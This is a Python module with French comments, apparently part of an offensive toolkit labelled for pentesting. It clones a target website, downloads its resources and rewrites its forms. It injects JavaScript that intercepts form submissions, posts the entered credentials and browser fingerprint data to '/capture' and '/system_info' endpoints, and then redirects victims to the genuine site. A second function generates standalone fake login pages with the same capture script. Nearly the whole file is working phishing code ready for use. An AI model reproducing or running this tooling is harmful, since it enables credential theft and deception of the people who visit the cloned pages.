#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🌐 SITE CLONER - Module de clonage de sites
Clone automatiquement des sites web pour le pentest
"""

import os
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import threading
from concurrent.futures import ThreadPoolExecutor

class SiteCloner:
    def __init__(self):
        self.cloned_sites = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def clone_site(self, target_url, output_dir="cloned_sites"):
        """Clone un site web complet"""
        print(f"🌐 Clonage de: {target_url}")
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        site_name = urlparse(target_url).netloc
        site_dir = os.path.join(output_dir, site_name)
        
        if not os.path.exists(site_dir):
            os.makedirs(site_dir)
            
        try:
            # Récupérer la page principale
            response = self.session.get(target_url)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Modifier les liens pour pointer vers notre serveur
            modified_html = self.modify_links(soup, target_url)
            
            # Sauvegarder la page principale
            with open(os.path.join(site_dir, 'index.html'), 'w', encoding='utf-8') as f:
                f.write(str(modified_html))
                
            # Télécharger les ressources (CSS, JS, images)
            self.download_resources(soup, target_url, site_dir)
            
            # Créer le template de phishing
            phishing_template = self.create_phishing_template(modified_html, target_url)
            
            template_path = os.path.join(site_dir, 'phishing_template.html')
            with open(template_path, 'w', encoding='utf-8') as f:
                f.write(phishing_template)
                
            self.cloned_sites[target_url] = {
                'original_url': target_url,
                'site_dir': site_dir,
                'template_path': template_path,
                'resources': []
            }
            
            print(f"✅ Site cloné: {site_dir}")
            return template_path
            
        except Exception as e:
            print(f"❌ Erreur clonage: {e}")
            return None
            
    def modify_links(self, soup, base_url):
        """Modifie les liens pour le phishing"""
        # Modifier les formulaires
        for form in soup.find_all('form'):
            form['action'] = '/login'
            form['method'] = 'post'
            
        # Modifier les liens externes
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith('http'):
                link['href'] = '#'
            elif href.startswith('/'):
                link['href'] = '#'
                
        # Modifier les ressources
        for tag in soup.find_all(['img', 'script', 'link']):
            if tag.get('src'):
                tag['src'] = self.fix_resource_url(tag['src'], base_url)
            if tag.get('href'):
                tag['href'] = self.fix_resource_url(tag['href'], base_url)
                
        return soup
        
    def fix_resource_url(self, url, base_url):
        """Corrige les URLs des ressources"""
        if url.startswith('http'):
            return url
        elif url.startswith('//'):
            return 'https:' + url
        elif url.startswith('/'):
            return urljoin(base_url, url)
        else:
            return urljoin(base_url, url)
            
    def download_resources(self, soup, base_url, site_dir):
        """Télécharge les ressources du site"""
        resources_dir = os.path.join(site_dir, 'resources')
        if not os.path.exists(resources_dir):
            os.makedirs(resources_dir)
            
        def download_resource(url, resource_type):
            try:
                if not url.startswith('http'):
                    url = urljoin(base_url, url)
                    
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    filename = os.path.basename(urlparse(url).path)
                    if not filename:
                        filename = f"{resource_type}_{hash(url)}.txt"
                        
                    filepath = os.path.join(resources_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(response.content)
                        
                    return filename
            except:
                pass
            return None
            
        # Télécharger CSS
        for css in soup.find_all('link', rel='stylesheet'):
            if css.get('href'):
                download_resource(css['href'], 'css')
                
        # Télécharger JS
        for script in soup.find_all('script', src=True):
            if script.get('src'):
                download_resource(script['src'], 'js')
                
        # Télécharger images
        for img in soup.find_all('img', src=True):
            if img.get('src'):
                download_resource(img['src'], 'img')
                
    def create_phishing_template(self, soup, original_url):
        """Crée un template de phishing à partir du site cloné"""
        phishing_script = """
        <script>
        // Script de capture des credentials
        document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const formData = new FormData(form);
                    const data = {};
                    for (let [key, value] of formData.entries()) {
                        data[key] = value;
                    }
                    
                    // Envoyer les données au serveur
                    fetch('/capture', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    }).then(() => {
                        // Rediriger vers le vrai site
                        window.location.href = '""" + original_url + """';
                    });
                });
            });
        });
        
        // Collecte d'informations système
        const systemInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        fetch('/system_info', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(systemInfo)
        });
        </script>
        """
        
        # Insérer le script avant la fermeture de </body>
        body_tag = soup.find('body')
        if body_tag:
            script_tag = soup.new_tag('script')
            script_tag.string = phishing_script
            body_tag.append(script_tag)
        else:
            # Si pas de body, ajouter à la fin
            script_tag = soup.new_tag('script')
            script_tag.string = phishing_script
            soup.append(script_tag)
            
        return str(soup)
        
    def clone_multiple_sites(self, urls, output_dir="cloned_sites"):
        """Clone plusieurs sites en parallèle"""
        print(f"🌐 Clonage de {len(urls)} sites...")
        
        results = []
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(self.clone_site, url, output_dir) for url in urls]
            
            for future in futures:
                result = future.result()
                if result:
                    results.append(result)
                    
        return results
        
    def get_cloned_sites(self):
        """Retourne les sites clonés"""
        return self.cloned_sites
        
    def create_custom_template(self, site_url, custom_fields):
        """Crée un template personnalisé"""
        print(f"🎨 Création template personnalisé: {site_url}")
        
        template_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login - {site_url}</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }}
                .container {{
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                    width: 100%;
                    max-width: 400px;
                }}
                .logo {{
                    text-align: center;
                    margin-bottom: 30px;
                    font-size: 24px;
                    font-weight: bold;
                    color: #333;
                }}
                .form-group {{
                    margin-bottom: 20px;
                }}
                .form-group label {{
                    display: block;
                    margin-bottom: 5px;
                    color: #555;
                    font-weight: 500;
                }}
                .form-group input {{
                    width: 100%;
                    padding: 12px;
                    border: 2px solid #ddd;
                    border-radius: 5px;
                    font-size: 16px;
                    box-sizing: border-box;
                }}
                .form-group input:focus {{
                    outline: none;
                    border-color: #667eea;
                }}
                .submit-btn {{
                    width: 100%;
                    background: #667eea;
                    color: white;
                    padding: 12px;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                    transition: background 0.3s;
                }}
                .submit-btn:hover {{
                    background: #5a6fd8;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">{site_url}</div>
                <form method="POST" action="/login">
        """
        
        # Ajouter les champs personnalisés
        for field in custom_fields:
            template_html += f"""
                    <div class="form-group">
                        <label for="{field['name']}">{field['label']}</label>
                        <input type="{field['type']}" id="{field['name']}" name="{field['name']}" required>
                    </div>
            """
            
        template_html += """
                    <button type="submit" class="submit-btn">Se connecter</button>
                </form>
            </div>
            
            <script>
                // Script de capture
                document.querySelector('form').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const formData = new FormData(this);
                    const data = {};
                    for (let [key, value] of formData.entries()) {
                        data[key] = value;
                    }
                    
                    fetch('/capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    }).then(() => {
                        window.location.href = 'https://google.com';
                    });
                });
            </script>
        </body>
        </html>
        """
        
        # Sauvegarder le template
        template_path = f"templates/custom_{urlparse(site_url).netloc}.html"
        os.makedirs("templates", exist_ok=True)
        
        with open(template_path, 'w', encoding='utf-8') as f:
            f.write(template_html)
            
        print(f"✅ Template personnalisé créé: {template_path}")
        return template_path 